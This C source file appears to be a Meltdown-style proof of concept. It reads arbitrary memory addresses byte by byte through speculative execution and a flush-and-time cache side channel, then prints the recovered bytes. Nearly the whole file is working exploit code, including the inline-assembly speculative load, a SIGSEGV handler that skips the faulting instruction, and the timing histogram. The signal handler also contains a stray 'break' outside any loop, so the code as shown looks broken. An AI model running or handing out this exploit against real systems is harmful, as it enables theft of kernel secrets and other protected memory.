#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>
#include "../utils/cache_instr.h"
#include <x86intrin.h>

#define TARGET_OFFSET	12
#define TARGET_SIZE	(1 << TARGET_OFFSET)   //4096
#define BITS_READ	8
#define VARIANTS_READ	(1 << BITS_READ)   //256

int cache_hit_threshold = 400;

int flag =1;    //显示错误原因

static char target_array[VARIANTS_READ * TARGET_SIZE];

void clflush_target(void)
{
	int i;

	for (i = 0; i < VARIANTS_READ; i++)
		flush(&target_array[i * TARGET_SIZE]);
}

extern char stopspeculate[];

static void __attribute__((noinline))
speculate(unsigned long addr)
{
	__asm__ volatile (
		"1:\n\t"

		".rept 300\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n\t"

		"movzx (%[addr]), %%eax\n\t"
		"shl $12, %%rax\n\t"
		"jz 1b\n\t"
		"movzx (%[target], %%rax, 1), %%rbx\n"

		"stopspeculate: \n\t"
		"nop\n\t"
		:
		: [target] "r" (target_array),
		  [addr] "r" (addr)
		: "rax", "rbx"
	);
}


static int hist[VARIANTS_READ];
void check(void)
{
	int i, time, mix_i;
	register uint64_t time1, time2;
	volatile char *addr;

	for (i = 0; i < VARIANTS_READ; i++) {
		mix_i = ((i * 167) + 13) & 255;

		addr = &target_array[mix_i * TARGET_SIZE];
		time1 = rdtscp();
        maccess(addr);
        time2 = rdtscp();

		if ((int)(time2 - time1) <= cache_hit_threshold)
			hist[mix_i]++;
	}
}



void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	ucontext_t *ucontext = context;
	if (flag){
		unsigned long err = ucontext->uc_mcontext.gregs[REG_ERR];
		const char *scode = (siginfo->si_code == SEGV_MAPERR) ? "MAPERR"
						: (siginfo->si_code == SEGV_ACCERR) ? "ACCERR"
														: "OTHER";
		fprintf(stderr,
			"[SEGV] addr=%p siginfo_code=%d(%s) PF_ERR=0x%lx  [P=%lu W/R=%lu U/S=%lu]\n",
			siginfo->si_addr, siginfo->si_code, scode, err,
			(err & 1UL), ((err >> 1) & 1UL), ((err >> 2) & 1UL));
		fflush(stderr);
		break;
	}


	ucontext->uc_mcontext.gregs[REG_RIP] = (greg_t)&stopspeculate;
	return;
}

int set_signal()
{
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};


	return sigaction(SIGSEGV, &act, NULL);
}

#define CYCLES 1000
int ReadOneByte(unsigned long addr)
{
	int i, ret = 0, max = -1, maxi = -1;
	static char buf[256];

	memset(hist, 0, sizeof(hist));

	for (i = 0; i < CYCLES; i++) {

		clflush_target();

		mfence();

		speculate(addr);

		check();
	}


	for (i = 1; i < VARIANTS_READ; i++) {
		if (!isprint(i))
			continue;
		if (hist[i] && hist[i] > max) {
			max = hist[i];
			maxi = i;
		}
	}

	return maxi;
}


static void pin_cpu0()
{
	cpu_set_t mask;

	/* PIN to CPU0 */
	CPU_ZERO(&mask);
	CPU_SET(0, &mask);
	sched_setaffinity(0, sizeof(cpu_set_t), &mask);
}

int main(int argc, char *argv[])
{
	int ret, i, score, is_vulnerable;
	unsigned long addr, size;

    if (argc == 3 || argc == 4)
    {
        sscanf(argv[1], "%lx", &addr);
        sscanf(argv[2], "%lx", &size);

        if (argc == 4)
        {
            sscanf(argv[3], "%d", &cache_hit_threshold);
        }
    }
    else
    {
        fprintf(stderr, "Usage: %s <hex_addr> <length> [cache_hit_threshold]\n", argv[0]);
        return 1;
    }

	

	memset(target_array, 1, sizeof(target_array));

	ret = set_signal();
	pin_cpu0();


    for (i = 0; i < size; i++)
    {
        ret = ReadOneByte(addr);
        if (ret == -1)
            ret = 0xff;
        printf("read %lx = %x %c (score=%d/%d)\n",
               addr, ret, isprint(ret) ? ret : ' ',
               ret != 0xff ? hist[ret] : 0,
               1000);
        addr++;
    }


}